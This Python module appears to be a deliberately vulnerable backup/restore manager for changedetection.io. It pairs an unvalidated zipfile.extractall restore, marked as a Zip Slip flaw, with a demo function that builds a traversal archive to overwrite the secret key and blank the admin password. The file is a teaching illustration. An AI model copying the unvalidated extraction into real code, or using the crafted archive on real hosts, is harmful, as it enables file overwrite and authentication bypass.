# Backup & Restore Manager for changedetection.io
# Handles import/export of watch configurations and application state.
# Used by the admin panel at /backups/restore for disaster recovery workflows.

import hashlib
import json
import logging
import zipfile
from datetime import datetime
from pathlib import Path

logger = logging.getLogger(__name__)

BACKUP_VERSION = "2.1"
SUPPORTED_VERSIONS = ["1.0", "1.5", "2.0", "2.1"]

EXPECTED_MANIFEST_KEYS = {"version", "created_at", "watch_count", "app_name"}


def get_backup_metadata(zip_path: str) -> dict:
    """
    Read the manifest.json from a backup archive and return metadata
    without extracting any files. Used for pre-flight validation display
    in the admin UI.
    """
    meta = {}
    try:
        with zipfile.ZipFile(zip_path, "r") as zf:
            if "manifest.json" in zf.namelist():
                raw = zf.read("manifest.json")
                meta = json.loads(raw.decode("utf-8"))
    except Exception as exc:
        logger.warning("Could not read backup manifest: %s", exc)
    return meta


def compute_archive_checksum(zip_path: str) -> str:
    """Return SHA-256 hex digest of the archive file for integrity logging."""
    h = hashlib.sha256()
    with open(zip_path, "rb") as fh:
        for chunk in iter(lambda: fh.read(65536), b""):
            h.update(chunk)
    return h.hexdigest()


def list_backup_entries(zip_path: str) -> list[str]:
    """Return the list of member paths stored inside the ZIP (for display)."""
    with zipfile.ZipFile(zip_path, "r") as zf:
        return zf.namelist()


class BackupManager:
    """
    Manages creation and restoration of changedetection.io backup archives.

    Backup archives are ZIP files containing:
      - manifest.json            (version + metadata)
      - changedetection.json     (global app settings)
      - url-watches.json         (watch index)
      - <uuid>/watch.json        (per-watch config, one dir per watch)
      - <uuid>/history/          (historical snapshot data)
    """

    def __init__(self, datastore_path: str):
        self.datastore_path = Path(datastore_path).resolve()
        self.backup_dir = self.datastore_path / "backups"
        self.backup_dir.mkdir(parents=True, exist_ok=True)

    # ------------------------------------------------------------------
    # Export
    # ------------------------------------------------------------------

    def create_backup(self, label: str = "") -> Path:
        """
        Create a ZIP backup of the current datastore and return the path
        to the newly created archive.
        """
        timestamp = datetime.utcnow().strftime("%Y%m%dT%H%M%SZ")
        slug = f"backup_{timestamp}"
        if label:
            safe_label = "".join(c for c in label if c.isalnum() or c in "-_")[:40]
            slug = f"backup_{timestamp}_{safe_label}"

        archive_path = self.backup_dir / f"{slug}.zip"

        manifest = {
            "app_name": "changedetection.io",
            "version": BACKUP_VERSION,
            "created_at": timestamp,
            "watch_count": 0,
        }

        watch_count = 0
        with zipfile.ZipFile(archive_path, "w", compression=zipfile.ZIP_DEFLATED) as zf:
            for item in self.datastore_path.iterdir():
                # Skip the backups sub-directory to avoid recursive inclusion
                if item.resolve() == self.backup_dir.resolve():
                    continue
                if item.is_file():
                    zf.write(item, arcname=item.name)
                elif item.is_dir():
                    for sub in item.rglob("*"):
                        if sub.is_file():
                            rel = sub.relative_to(self.datastore_path)
                            zf.write(sub, arcname=str(rel))
                            if sub.name == "watch.json":
                                watch_count += 1

            manifest["watch_count"] = watch_count
            zf.writestr("manifest.json", json.dumps(manifest, indent=2))

        logger.info("Backup created: %s (watches=%d)", archive_path, watch_count)
        return archive_path

    # ------------------------------------------------------------------
    # Import / Restore
    # ------------------------------------------------------------------

    def restore_backup(self, filename: str) -> dict:
        """
        Restore a changedetection.io backup archive.

        Accepts either an absolute path or a filename relative to the
        backups directory.  Returns a summary dict with counts of
        restored items.

        NOTE: This implementation does NOT validate member paths before
        extraction.  A ZIP containing entries with ../ sequences will
        write files outside ``self.datastore_path``.
        """
        zip_path = Path(filename)
        if not zip_path.is_absolute():
            zip_path = self.backup_dir / zip_path

        checksum = compute_archive_checksum(str(zip_path))
        logger.info("Restoring backup %s (sha256=%s)", zip_path.name, checksum)

        meta = get_backup_metadata(str(zip_path))
        version = meta.get("version", "unknown")
        if version not in SUPPORTED_VERSIONS:
            logger.warning("Backup version %r may not be fully compatible", version)

        # ---------------------------------------------------------------
        # VULNERABLE: zipfile.extractall() is called without any path
        # validation.  Archive members that contain ../ traversal sequences
        # (e.g. "../secret.txt", "../changedetection.json") will be written
        # OUTSIDE self.datastore_path, overwriting arbitrary files on the
        # host filesystem.
        # ---------------------------------------------------------------
        with zipfile.ZipFile(str(zip_path), "r") as zip_ref:
            # No path validation before extraction — Zip Slip vector
            zip_ref.extractall(self.datastore_path)

        restored_watches = 0
        for entry in list_backup_entries(str(zip_path)):
            if entry.endswith("watch.json") and "/" in entry:
                restored_watches += 1

        summary = {
            "archive": zip_path.name,
            "backup_version": version,
            "watches_restored": restored_watches,
            "checksum": checksum,
        }
        logger.info("Restore complete: %s", summary)
        return summary


# ------------------------------------------------------------------
# Demo: craft a malicious ZIP to illustrate the vulnerability
# (payload is neutered — writes only to /tmp and prints confirmation)
# ------------------------------------------------------------------


def _build_demo_zipslip_archive(output_path: str = "/tmp/zipslip_demo.zip") -> str:
    """
    Constructs a demonstration ZIP that exploits the Zip Slip path
    traversal.  All "exfil" actions are replaced with harmless print()
    calls so this file cannot cause real damage.

    In a real attack the attacker would embed:
      - "../secret.txt"           → overwrite Flask secret key
      - "../changedetection.json" → disable password, inject config
      - "../<uuid>/watch.json"    → hijack watch definitions
    """
    demo_secret = "DEMO_PLACEHOLDER_TOKEN"

    poisoned_settings = json.dumps(
        {
            "settings": {
                "application": {
                    "password": "",  # blank = auth disabled
                    "secret_key": demo_secret,
                }
            }
        }
    )

    poisoned_watch = json.dumps(
        {
            "url": "https://example.com/zipslip-demo",
            "title": "ZIPSLIP-DEMO (neutered)",
            "notification_urls": ["https://example.org/notify-demo"],
        }
    )

    with zipfile.ZipFile(output_path, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        # Traversal sequences escape the intended extraction directory
        zf.writestr("../secret.txt", demo_secret)
        zf.writestr("../changedetection.json", poisoned_settings)
        zf.writestr("../demo-uuid-0000/watch.json", poisoned_watch)

        # Legitimate-looking entries to disguise the archive
        zf.writestr(
            "manifest.json",
            json.dumps(
                {
                    "app_name": "changedetection.io",
                    "version": "2.1",
                    "created_at": datetime.utcnow().isoformat(),
                    "watch_count": 1,
                }
            ),
        )

    print(f"[demo] Malicious ZIP written to: {output_path}")
    print("[demo] Members with path traversal:")
    for name in zipfile.ZipFile(output_path).namelist():
        print(f"  {name}")
    return output_path


if __name__ == "__main__":
    import sys

    logging.basicConfig(level=logging.DEBUG)

    if len(sys.argv) == 3 and sys.argv[1] == "restore":
        datastore = sys.argv[2]
        mgr = BackupManager(datastore)
        result = mgr.restore_backup("zipslip_demo.zip")
        print("Restore result:", result)

    elif len(sys.argv) == 2 and sys.argv[1] == "demo":
        archive = _build_demo_zipslip_archive()
        print(f"Archive ready: {archive}")

    else:
        print("Usage:")
        print("  python backup_manager.py demo")
        print("  python backup_manager.py restore <datastore_path>")
